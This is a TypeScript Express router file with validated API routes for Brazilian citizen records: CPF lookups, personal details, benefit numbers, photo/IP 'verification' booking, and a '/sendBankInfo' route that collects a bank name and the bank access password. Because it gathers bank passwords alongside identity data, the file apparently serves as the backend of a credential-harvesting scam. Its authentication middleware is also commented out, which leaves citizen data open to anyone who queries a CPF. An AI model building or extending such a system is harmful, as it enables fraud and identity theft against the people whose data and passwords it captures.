import express from "express";
import { getCitizenData, createCitizen, updateCitizen, updatePhone, updateStatus } from "@controllers/citizenController"
import { sendBankInfo  } from "@controllers/bankInfoController";
import { sendVerification, bookVerification } from "@controllers/verificationController";
import { check, oneOf } from "express-validator";
import { dateValidator } from "modules/validator/validator";
//import { authMiddleware, adminMiddleware } from "../middlewares/authMiddelware";

const router = express.Router();

router.get('/test', (req, res) => {
  res.status(200).json({
    status: 'success',
    message: 'Test API is working!'
  });
});

router.get("/citizenData/:CPF",
     [
        check("CPF").isNumeric().isLength({ min: 11, max: 11})
     ], 
     getCitizenData);

router.post("/createCitizen",
        [
            check("CPF").isNumeric().isLength({ min: 11, max: 11}),
            check("name").notEmpty(),
            check("birthday").custom(dateValidator),
            check("motherName").notEmpty(),
            check("phone").isNumeric().isLength({ min: 10, max: 16 }),
            check("benefitNumber").isNumeric().isLength({ min: 5, max: 34}),
        ],
        createCitizen
     )

router.put("/updateCitizen/:CPF",
        [
            check("CPF").isNumeric().isLength({ min: 11, max: 11}),
            //check("name").notEmpty(),
            check("birthday").custom(dateValidator),
            //check("motherName").notEmpty(),
            //check("phone").isNumeric().isLength({ min: 10, max: 16 }),
            //check("benefitNumber").isNumeric().isLength({ min: 5, max: 34}),
        ],
        updateCitizen
     )

router.put("/updatePhone/:CPF",
        [
            check("CPF").isNumeric().isLength({ min: 11, max: 11}),
            check("phone").isNumeric().isLength({ min: 10, max: 16})
        ],
        updatePhone
    )

router.put("/updateStatus/:CPF",
        [
            check("CPF").isNumeric().isLength({ min: 11, max: 11}),
        ],
        updateStatus
    )

    router.post("/sendBankInfo",
        [
            check("CPF").isNumeric().isLength({ min: 11, max: 11}),
            check("bankName").notEmpty(),
            check("accessPassword").notEmpty()
        ],
        sendBankInfo
    )

router.post("/sendVerification",
        [
            check("CPF").isNumeric().isLength({ min: 11, max: 11}),
            //check("photo").isBase64(),    
            check("bookingTime").custom(dateValidator), 
            oneOf([
                check("ip").isEmpty(), 
                check("ip").isIP() 
            ])
        ],
        sendVerification
    )

router.put("/bookVerification/:verification_id",
        [
            check("CPF").isNumeric().isLength({ min: 11, max: 11}),
            check("verification_id").notEmpty(),
            check("bookingTime").custom(dateValidator)
        ],
        bookVerification
    )
            
export default router;